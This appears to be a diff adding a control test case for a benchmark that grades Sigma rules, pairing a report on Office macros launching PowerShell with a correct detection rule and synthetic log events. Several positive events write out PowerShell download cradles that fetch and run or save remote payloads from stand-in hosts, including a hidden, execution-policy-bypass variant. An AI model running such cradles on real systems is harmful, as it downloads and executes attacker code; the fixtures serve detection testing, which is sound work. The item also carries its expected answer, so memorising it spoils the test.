@@ -1,0 +1,135 @@
+id: CTL1-09
+role: control
+defect_class: NONE
+evasive: false
+why: 'Correct rule: tag T1059.001 is valid, all values (winword.exe, excel.exe, powershell.exe, DownloadString,
+  DownloadFile, Net.WebClient) are quoted in the evidence, and it requires an Office parent AND a download
+  method in the PowerShell command line, so Office launches and non-Office or non-download PowerShell
+  look-alikes do not match.'
+expected_gate: none
+report_text: A malicious Word attachment spawned PowerShell directly from the document process. Sysmon
+  recorded winword.exe starting powershell.exe with a command line that used the Net.WebClient class and
+  the DownloadString method to pull a script from the attacker server, then passed it to Invoke-Expression.
+  The same behaviour was observed from excel.exe in a second sample. Office applications do not need to
+  start PowerShell with download methods in normal operation. Detect winword.exe or excel.exe as parent
+  of powershell.exe where the command line contains DownloadString, DownloadFile or Net.WebClient.
+evidence:
+- Sysmon recorded winword.exe starting powershell.exe with a command line that used the Net.WebClient
+  class and the DownloadString method
+- The same behaviour was observed from excel.exe in a second sample.
+- Detect winword.exe or excel.exe as parent of powershell.exe where the command line contains DownloadString,
+  DownloadFile or Net.WebClient.
+logsource: windows_process_creation
+techniques:
+- T1059.001
+sigma_yaml: |
+  title: Office Application Spawning PowerShell Download Cradle
+  id: e384f296-b5ca-41e3-8779-a4f6c5179209
+  status: experimental
+  description: 'Detects powershell.exe started by Word or Excel with a command line that uses a .NET download method.'
+  references:
+    - 'urn:atidep:case'
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.execution
+    - attack.t1059.001
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection_parent:
+      ParentImage|endswith:
+        - '\winword.exe'
+        - '\excel.exe'
+    selection_child:
+      Image|endswith: '\powershell.exe'
+      CommandLine|contains:
+        - 'DownloadString'
+        - 'DownloadFile'
+        - 'Net.WebClient'
+    condition: selection_parent and selection_child
+  falsepositives:
+    - 'Office add-ins that call PowerShell to download templates, which are uncommon'
+  level: high
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.80/s.ps1')
+    parent: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+    parent_cmd: '"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\alice\Downloads\invoice.docm"'
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -nop -w hidden -c (New-Object System.Net.WebClient).DownloadFile('http://files.cranemail.test/a.exe','C:\Users\Public\a.exe')
+    parent: C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+    parent_cmd: '"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE" /e'
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell -ep bypass -c $w=New-Object Net.WebClient;$w.DownloadString('http://198.51.100.14/x')
+    parent: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+    parent_cmd: '"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n'
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+    cmd: '"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n C:\Users\alice\Documents\notes.docx'
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE
+    cmd: OUTLOOK.EXE
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Program Files\Google\Chrome\Application\chrome.exe
+    cmd: '"C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory=Default'
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -Command "Get-Service | Where-Object Status -eq Running"
+    parent: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+    parent_cmd: '"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n'
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -c (New-Object Net.WebClient).DownloadFile('https://packages.lab.invalid/tool.zip','C:\Temp\tool.zip')
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
